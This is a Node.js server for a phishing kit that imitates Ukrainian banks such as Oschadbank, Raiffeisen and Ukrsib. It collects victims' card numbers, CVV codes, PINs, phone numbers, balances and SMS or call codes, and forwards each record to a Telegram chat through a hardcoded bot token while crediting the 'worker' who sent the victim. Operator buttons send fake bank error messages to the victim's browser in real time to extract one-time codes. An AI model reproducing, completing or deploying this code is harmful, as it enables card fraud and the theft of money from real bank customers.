const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// НАСТРОЙКИ
const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = '-4970332008';

// Динамический webhook для Render
const hostname = process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${process.env.PORT || 3000}`;
const WEBHOOK_URL = `https://${hostname}/bot${TELEGRAM_BOT_TOKEN}`;

// СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
const banksForRequestButton = [
    'Райффайзен', 'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Логирование запросов
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

// Обслуживание файлов из корня
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Установка webhook динамически
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// Тестовое сообщение
bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// Тест бота
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook для Telegram
app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ 
    server,
    path: '/ws' // Добавляем путь для WS
});

const clients = new Map();
const sessions = new Map();
const cardVisits = new Map(); // Для подсчёта по номеру карты

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = message.toString();
            if (data === 'ping') {
                ws.send('pong');
                return;
            }
            const parsed = JSON.parse(data);
            if (parsed.type === 'register' && parsed.sessionId) {
                clients.set(parsed.sessionId, ws);
                console.log(`Client registered: ${parsed.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, bankTheme, ...stepData } = req.body;

    // Декодируем referrer из Base64
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, theme=${bankTheme}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    // Подсчёт по номеру карты
    const cardNumber = newData.card_confirm || newData.card;
    if (cardNumber) {
        const cardKey = cardNumber.replace(/\s/g, '');
        const cardData = cardVisits.get(cardKey) || { visitCount: 0 };
        cardData.visitCount++;
        cardVisits.set(cardKey, cardData);
        newData.cardVisitCount = cardData.visitCount;
    }

    if (newData.call_code_input) {
        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>Новий лог!</b>\n\n`;
        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        if (newData.cardVisitCount) {
            const visitText = newData.cardVisitCount === 1 ? 'NEW' : `${newData.cardVisitCount} раз`;
            message += `<b>Кількість переходів по карті:</b> ${visitText}\n`;
        } else {
            const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
            message += `<b>Кількість переходів:</b> ${visitText}\n`;
        }
        message += `<b>Worker:</b> @${workerNick}\n`;

        sendToTelegram(message, sessionId, newData.bankName, bankTheme);
    }

    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    // Декодируем referrer из Base64
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>Отримано SMS!</b>\n\n`;
        message += `<b>Код:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName, bankTheme) {
    let keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ЛК', callback_data: `lk_${bankTheme}:${sessionId}` }
        ],
        [
            { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
        ],
        [
            { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД', callback_data: `code_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ],
        [
            { text: 'BAN', callback_data: `ban:${sessionId}` },
            { text: 'СВОЙ', callback_data: `custom:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[1].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }

    // Если банк не Ощад, убираем ЗВОНОК
    if (bankName !== 'Ощадбанк') {
        keyboard = keyboard.filter(row => row[0].text !== 'ЗВОНОК');
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const parts = callbackQuery.data.split(':');
    const type = parts[0];
    const sessionId = parts[1];
    console.log(`Callback: type=${type}, sessionId=${sessionId}`); // Debug
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                break;
            case 'lk_oschadbank':
            case 'lk_raiffeisen':
            case 'lk_vostok':
            case 'lk_izibank':
            case 'lk_ukrsib':
                ws.send(JSON.stringify({ type, data: {} }));
                break;
            case 'call_oschad':
                ws.send(JSON.stringify({ type: 'call_oschad', data: {} }));
                break;
            case 'request_details':
                ws.send(JSON.stringify({ type: 'request_details', data: {} }));
                break;
            case 'other':
                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
                ws.send(JSON.stringify({ type: 'other', data: commandData }));
                break;
            case 'pin_error':
                commandData = { text: "Невірний ПІН, Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом" };
                ws.send(JSON.stringify({ type: 'pin_error', data: commandData }));
                break;
            case 'number_error':
                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                ws.send(JSON.stringify({ type: 'number_error', data: commandData }));
                break;
            case 'ban':
                ws.send(JSON.stringify({ type: 'ban', data: {} }));
                break;
            case 'custom':
                // Для "СВОЙ" - ждём дополнительного сообщения от админа
                bot.sendMessage(CHAT_ID, 'Введіть текст для клієнта:', {
                    reply_markup: {
                        inline_keyboard: [[{ text: 'Відправити', callback_data: `send_custom:${sessionId}` }]]
                    }
                });
                // Здесь нужно обработать следующее сообщение, но для простоты используем force_reply или отдельный handler
                // В реальности добавить bot.on('message') для обработки
                break;
            case 'send_custom':
                // Это упрощённо; в полном коде нужно хранить pending custom messages
                const pendingText = 'Ваш кастомний текст тут'; // Заменить на реальный ввод
                ws.send(JSON.stringify({ type: 'custom', data: { text: pendingText } }));
                break;
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
        console.log(`WS not found for ${sessionId}, state: ${ws ? ws.readyState : 'null'}`);
    }
});

// Обработка кастомных сообщений (упрощённо)
bot.on('message', (msg) => {
    if (msg.text && msg.chat.id.toString() === CHAT_ID) {
        // Логика для отправки кастомного текста клиенту (нужен sessionId из контекста)
        // Для этого нужно хранить состояние, например в Map pendingCustom[chatId] = {sessionId, text}
        // Здесь placeholder
    }
});

// Обработка ошибок Telegram
bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

// Глобальная обработка ошибок
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
